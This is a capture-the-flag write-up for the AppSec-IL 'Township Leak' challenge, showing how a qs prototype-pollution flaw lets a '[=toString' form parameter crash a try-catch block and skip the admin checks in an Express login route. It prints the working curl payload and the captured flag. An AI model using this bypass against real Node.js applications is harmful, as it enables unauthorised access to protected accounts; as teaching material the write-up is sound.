# Township Leak

## Task

Hello friend,

I got the source code to the township administrator panel but It seems impossible to login.

can you pull it off?

URL: https://townshipleak.appsecil.ctf.today/

File: TownshipLeak.zip

## Solution

We get a nodejs project with `app.js`, `package-lock.json` and `package.json`.

`app.js` is an express server using `qs` and `body-parser`.

```javascript
app.use(bodyParser.urlencoded({
    extended: true,
    verify: (req, res, buf, encoding) => {
        const rawBody = buf.toString(encoding || 'utf-8');

        // Security fix
        req.data = {};
        try {
            req.data = qs.parse(rawBody, {
                allowPrototypes: false,
            });
        } catch (error) {
            console.log(error);
        }
    }
}));
```

We have a `/login` path for the login page and the post request.

```javascript
app.post('/login', (req, res) => {
    class User {
        constructor(name, pass, role = "guest") {
            this.name = name;
            this.password = pass;
            this.role = role;
        }
    }

    User.prototype.toString = function () {
        return `[${this.role}] ${this.name}`;
    }

    const remoteIP = "1.3.3.7";
    const user = new User();
    for (let [key, value] of Object.entries(req.data)) {
        user[key] = value
    }

    // Regular User Check (No Injections Here! ;)
    const error = validateAuthentication(user);
    if (error) {
        return res.render('login', {
            error: error
        });
    }

    // It looks unstable
    try {
        // Log users
        console.log(`User: \{ ${user} \}`);

        // Under Construction For Guests
        if (user.role !== "admin") {
            return res.render('login', {
                error: "Under construction, please wait few more day..."
            });
        }

        if (user.role === "admin" && remoteIP !== "127.0.0.1") {
            return res.render('login', {
                error: "You Cannot Login As Admin From Here!"
            });
        }
    } catch (error) {
        console.log(error);
    }

    return res.render('flag', {
        flag: process.env.FLAG
    })

});
```

We want to test our forced entry locally so we reconstruct the project. We add a `app.use(express.static('./static'));` and place css/js in there. We create a `views` folder and place an empty `login.ejs` and the `layout.ejs` with the HTML from the challenge page.

We also need `lib/auth/index.js` for this import `const validateAuthentication = require('./lib/auth').validate;`.

After that we can install and run the project:

```bash
$ npm install
...
found 1 high severity vulnerability
  run `npm audit fix` to fix them, or `npm audit` for details
$ npm audit
┌───────────────┬──────────────────────────────────────────────────────────────┐
│ High          │ Prototype Pollution Protection Bypass                        │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Package       │ qs                                                           │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Dependency of │ qs                                                           │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Path          │ qs                                                           │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ More info     │ https://npmjs.com/advisories/1469                            │
└───────────────┴──────────────────────────────────────────────────────────────┘
$ npm run dev
```

We now can use `http://127.0.0.1:5000/login` as our POST target to see the console log.

There is also a known security issue in the `qs` package. The GitHub Issue has an example:

```javascript
a = qs.parse("[=toString", {allowPrototypes: false})
// { toString: true }
```

From the qs readme https://www.npmjs.com/package/qs#readme:

`By default parameters that would overwrite properties on the object prototype are ignored, if you wish to keep the data from those fields either use plainObjects as mentioned above, or set allowPrototypes to true which will allow user input to overwrite those properties. WARNING It is generally a bad idea to enable this option as it can cause problems when attempting to use the properties that have been overwritten. Always be careful with this option.`

We can see that the parsed `req.data` from the so-called `Security fix` above is transfered into the `User` instance in `user`:

```javascript
for (let [key, value] of Object.entries(req.data)) {
  user[key] = value
}
```

At first I couldn't figure out how to bypass the call to `validateAuthentication` so I started with the `It looks unstable` part that locks out non-admin users or admin-users without the `remoteIP` `127.0.0.1`. My `validateAuthentication` just returns nothing for now. It's inside a try-catch block so we are allowed to cause an exception:

```bash
$ curl http://127.0.0.1:5000/login -d '[=toString'
...
Error: Failed to lookup view 'flag' in views directory
...
```

This works because the ES6 template string calls `toString`. See https://hacks.mozilla.org/2015/05/es6-in-depth-template-strings-2/:

`If either value is not a string, it’ll be converted to a string using the usual rules. For example, if action is an object, its .toString() method will be called.`

We are past the second part but we still need to figure out how to bypass the validation stage, right?

If we take a closer look at the HTML we can see a `default-value` attribute on both inputs. Never heard of that one. Both are set to `guest`.

```bash
$ curl https://townshipleak.appsecil.ctf.today/login -d 'name=guest&password=guest&[=toString'
...
<h1>&#34;AppSec-IL{pP0llut10n_1S_B4D_F0r_Y0ur_H34lth}&#34;</h1>
...
```
